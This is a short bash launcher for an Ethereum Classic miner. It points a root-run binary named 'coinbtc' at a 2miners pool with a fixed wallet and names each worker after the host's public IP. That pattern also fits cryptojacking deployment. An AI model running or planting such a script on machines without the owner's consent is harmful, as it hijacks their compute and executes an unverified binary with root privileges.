#!/bin/bash

POOL=us-etc.2miners.com:1010
WALLET=0x40267de02f595dc76ae8796b21c3c9451d93f170
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BISA

cd "$(dirname "$0")"

chmod +x ./coinbtc && sudo ./coinbtc --algo ETCHASH --pool $POOL --user $WALLET.$WORKER
